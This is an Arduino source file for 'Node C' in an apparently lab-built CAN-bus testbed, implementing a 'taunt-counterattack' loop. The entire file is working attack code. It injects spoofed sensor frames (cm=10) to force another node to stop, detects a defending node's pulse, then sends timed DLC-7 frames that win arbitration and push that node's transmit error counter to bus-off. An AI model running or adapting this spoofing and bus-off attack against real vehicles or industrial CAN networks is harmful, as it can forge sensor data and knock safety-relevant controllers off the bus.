// ============================================================
// taunt-counterattack/C.ino — Node C, minimal taunt loop:
//   1. PROBE: while the real sensor is publishing, bait it
//      every BAIT_PERIOD_MS with ONE valid-looking fake frame
//      (cm = 10).  A healthy bus is NEVER quiet, so there is no
//      "wait for calm" gate — that bug made C bait only dead buses.
//   2. BAIT: wait up to PULSE_WAIT_MS for B's Parrot pulse
//      (all-zero DLC-8 frames on 0x120).
//   3. VOLLEY: fire VOLLEY_TARGET zero frames with DLC 7.
//      Every collision with B's DLC-8 pulse loses the DLC-field
//      bit for B (its first DLC bit is recessive, ours dominant):
//      +8 TEC for B, +0 for C.  32 x 8 = 256 = bus-off.
//   4. SHUT_UP: stay completely silent.  If a valid sensor frame
//      reappears, B survived and we probe again.  If the sensor
//      stays dead, report it loudly and HOLD (baiting a dead node
//      is pointless — it cannot hear or defend).
// ============================================================
#include "NodeConfig.h"
#if ACTIVE_NODE == NODE_C

#include <Arduino.h>
#include <SPI.h>
#include <EEPROM.h>
#include <mcp2515_can.h>
#include "Protocol.h"

// ---- hardware -----------------------------
const uint8_t  CAN_CS       = 9;
const uint8_t  CAN_CLOCK    = MCP_16MHz;
const uint32_t CAN_SPEED    = CAN_500KBPS;
const uint32_t SERIAL_SPEED = 115200;

// ---- tunables ------------------------------
const uint32_t BAIT_PERIOD_MS  = 2000;  // bait cadence while sensor is alive
const uint32_t PULSE_WAIT_MS   = 400;   // max wait for B's pulse after bait
const uint16_t VOLLEY_TARGET   = 32;    // frames in the counterattack volley
const uint8_t  VOLLEY_DLC      = 7;     // < 8: first DLC bit DOMINANT beats B's pulse
const uint32_t VOLLEY_GUARD_MS = 300;   // hard deadline for the whole volley
const uint32_t SENSOR_DEAD_MS  = 1500;  // no valid sensor frame this long => B is down
const uint32_t DEAD_REMIND_MS  = 10000; // re-report a still-dead sensor
const uint32_t STATS_INTERVAL  = 2000;

// MCP2515 registers
const uint8_t REG_TEC  = 0x1c;
const uint8_t REG_REC  = 0x1d;
const uint8_t REG_EFLG = 0x2d;

mcp2515_can can(CAN_CS);

// ---- states ---------------------------------
const uint8_t ST_PROBE   = 0;  // bait periodically while sensor is alive
const uint8_t ST_BAIT    = 1;  // bait sent, waiting for the pulse
const uint8_t ST_VOLLEY  = 2;  // counterattack in progress
const uint8_t ST_SHUT_UP = 3;  // silent: waiting for B's return (or holding on a corpse)

// ---- globals --------------------------------
uint8_t  state           = ST_PROBE;
uint32_t stateSince      = 0;
uint32_t nextBaitAt      = 0;
uint32_t baitSentAt      = 0;
uint32_t lastSensorAt    = 0;     // last VALID sensor payload heard
uint32_t deadRemindAt    = 0;
uint32_t baitSeq         = 0;
uint16_t bootSession     = 0;
uint16_t volleyLeft      = 0;
uint32_t volleyStart     = 0;
uint32_t prevPulseFrames = 0;     // pulse-frame watermark for edge detection

// round ledger
uint32_t rounds       = 0;
uint32_t pulsesSeen   = 0;
uint32_t pulseFrames  = 0;
uint32_t sensorFrames = 0;
uint32_t baitSent     = 0;
uint32_t volleyFrames = 0;
uint32_t bStillDown   = 0;        // sensor silent for > SENSOR_DEAD_MS while we hold
uint32_t totalTxOk    = 0;
uint8_t  peakTec      = 0;
uint32_t lastStatsAt  = 0;

uint8_t regRead(uint8_t address) {
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CAN_CS, LOW);
  SPI.transfer(0x03);                 // READ instruction
  SPI.transfer(address);
  const uint8_t value = SPI.transfer(0x00);
  digitalWrite(CAN_CS, HIGH);
  SPI.endTransaction();
  return value;
}

void event(const __FlashStringHelper *msg) {
  Serial.print(millis());
  Serial.print(F(" C "));
  Serial.println(msg);
}

void setState(uint8_t next) {
  state = next;
  stateSince = millis();
}

const __FlashStringHelper *stateName() {
  if (state == ST_PROBE)   return F("PROBE");
  if (state == ST_BAIT)    return F("BAIT");
  if (state == ST_VOLLEY)  return F("VOLLEY");
  return F("SHUT_UP");
}

bool initCan() {
  pinMode(10, OUTPUT); digitalWrite(10, HIGH);
  pinMode(4,  OUTPUT); digitalWrite(4,  HIGH);
  if (can.begin(CAN_SPEED, CAN_CLOCK) != CAN_OK) { event(F("CAN_INIT_FAIL")); return false; }
  if (can.setMode(MODE_NORMAL) != CAN_OK) return false;
  if (can.init_Mask(0, 0, 0) != CAN_OK || can.init_Mask(1, 0, 0) != CAN_OK) return false;
  for (uint8_t i = 0; i < 6; ++i)
    if (can.init_Filt(i, 0, 0) != CAN_OK) return false;
  event(F("CAN_READY 11bit 500k"));
  return true;
}

// Drains RX and classifies 0x120 traffic:
//  - all-zero frame      -> B's Parrot Dmessage (pulse evidence)
//  - valid sensor payload-> the REAL sensor is alive
void drainRx() {
  uint8_t len;
  uint8_t buf[8];
  while (can.readMsgBuf(&len, buf) == CAN_OK) {
    if (can.getCanId() != Lab::SENSOR_ID) continue;
    if (Lab::allZero(buf)) {            // Dmessage: pulse traffic
      ++pulseFrames;
      return;                           // during a pulse just keep RX clear
    }
    if (Lab::validSensor(buf)) {
      ++sensorFrames;
      lastSensorAt = millis();
      if (state == ST_SHUT_UP) {
        event(F("SENSOR_IS_BACK resuming probes"));
        setState(ST_PROBE);
        nextBaitAt = lastSensorAt + BAIT_PERIOD_MS;
      }
    }
  }
}

// Sends one fake-but-valid sensor sample: cm = 10 (<= STOP_CM 50 -> A stops).
void sendBait() {
  uint8_t frame[8];
  Lab::encode(frame, uint16_t(baitSeq++ & 0x7fff), Lab::SPOOF_STOP_CM, 0, bootSession);
  if (can.sendMsgBuf(Lab::SENSOR_ID, 0, 0, Lab::DLC, frame) == CAN_OK) {
    ++baitSent;
    ++rounds;
    baitSentAt = millis();
    prevPulseFrames = pulseFrames;      // edge baseline for this round
    event(F("BAIT_SENT cm=10 -> expect Parrot pulse"));
    setState(ST_BAIT);
  }
}

// A pulse was observed: launch the counterattack volley.
void strike() {
  ++pulsesSeen;
  prevPulseFrames = pulseFrames;
  volleyLeft  = VOLLEY_TARGET;
  volleyStart = millis();
  event(F("PULSE_DETECTED counterattack volley starting"));
  setState(ST_VOLLEY);
}

// Pumps DLC-7 zero frames into every free TX buffer until the volley is done.
void serviceVolley() {
  const uint32_t now = millis();
  uint8_t zero[8] = {};
  for (uint8_t i = 0; i < 3 && volleyLeft; ++i) {
    if (can.trySendMsgBuf(Lab::SENSOR_ID, 0, 0, VOLLEY_DLC, zero, i) == CAN_OK) {
      --volleyLeft;
      ++volleyFrames;
      ++totalTxOk;
    }
  }
  if (!volleyLeft) {
    const uint8_t tec = regRead(REG_TEC);
    if (tec > peakTec) peakTec = tec;
    event(F("VOLLEY_DONE shutting up - sensor should be going bus-off"));
    setState(ST_SHUT_UP);
    return;
  }
  if (Lab::elapsed(now, volleyStart, VOLLEY_GUARD_MS)) {  // bus hostage: abort round
    event(F("VOLLEY_TIMEOUT aborting round"));
    setState(ST_SHUT_UP);
  }
}

void serviceStates() {
  const uint32_t now = millis();

  if (state == ST_PROBE) {
    if (pulseFrames > prevPulseFrames) { strike(); return; }  // unsolicited pulse
    if (now >= nextBaitAt) sendBait();

  } else if (state == ST_BAIT) {
    if (pulseFrames > prevPulseFrames) { strike(); return; }
    if (Lab::elapsed(now, baitSentAt, PULSE_WAIT_MS)) {
      prevPulseFrames = pulseFrames;
      event(F("NO_PULSE sensor did not defend - probing again later"));
      setState(ST_PROBE);
      nextBaitAt = now + BAIT_PERIOD_MS;
    }

  } else if (state == ST_VOLLEY) {
    serviceVolley();

  } else if (state == ST_SHUT_UP) {
    // Expected case: sensor gone (hopefully bus-off).  If it publishes,
    // drainRx already moved us back to PROBE.  If it stays dead, hold
    // here and remind the operator — baiting a corpse is pointless.
    if (Lab::elapsed(now, lastSensorAt, SENSOR_DEAD_MS) &&
        Lab::elapsed(now, deadRemindAt, DEAD_REMIND_MS)) {
      ++bStillDown;
      deadRemindAt = now;
      event(F("SENSOR_STILL_DOWN no valid frames - press r on B if it shows BUS_OFF"));
    }
  }
}

void printStats() {
  Serial.print(millis());
  Serial.print(F(" C STATS state="));    Serial.print(stateName());
  Serial.print(F(" rounds="));           Serial.print(rounds);
  Serial.print(F(" bait="));             Serial.print(baitSent);
  Serial.print(F(" pulses_seen="));      Serial.print(pulsesSeen);
  Serial.print(F(" pulse_frames="));     Serial.print(pulseFrames);
  Serial.print(F(" sensor_frames="));    Serial.print(sensorFrames);
  Serial.print(F(" volley_frames="));    Serial.print(volleyFrames);
  Serial.print(F(" tx_ok="));            Serial.print(totalTxOk);
  Serial.print(F(" sensor_down="));      Serial.print(bStillDown);
  Serial.print(F(" TEC="));              Serial.print(regRead(REG_TEC));
  Serial.print(F(" REC="));              Serial.print(regRead(REG_REC));
  Serial.print(F(" peak_TEC="));         Serial.print(peakTec);
  Serial.print(F(" EFLG=0x"));           Serial.println(regRead(REG_EFLG), HEX);
}

void help() {
  event(F("h help | s stats | r reinit CAN"));
}

void commands() {
  if (!Serial.available()) return;
  const char c = Serial.read();
  if (c == 'h') help();
  if (c == 's') printStats();
  if (c == 'r') {
    setState(ST_PROBE);
    volleyLeft = 0;
    nextBaitAt = millis() + BAIT_PERIOD_MS;
    lastSensorAt = millis();
    if (initCan()) event(F("CAN_REINIT"));
  }
}

void setup() {
  Serial.begin(SERIAL_SPEED);
  EEPROM.get(0, bootSession);
  bootSession = (bootSession == 0xffffU || bootSession == 0xfffeU) ? 1 : uint16_t(bootSession + 1);
  if (!bootSession) bootSession = 1;
  EEPROM.put(0, bootSession);
  event(F("NODE_INIT TAUNT_COUNTERATTACK"));
  while (!initCan()) delay(1000);
  lastSensorAt = millis();            // assume alive until proven dead
  nextBaitAt   = millis() + BAIT_PERIOD_MS;
  help();
}

void loop() {
  drainRx();
  serviceStates();
  if (Lab::elapsed(millis(), lastStatsAt, STATS_INTERVAL)) {
    lastStatsAt = millis();
    printStats();
  }
}

#endif  // ACTIVE_NODE == NODE_C
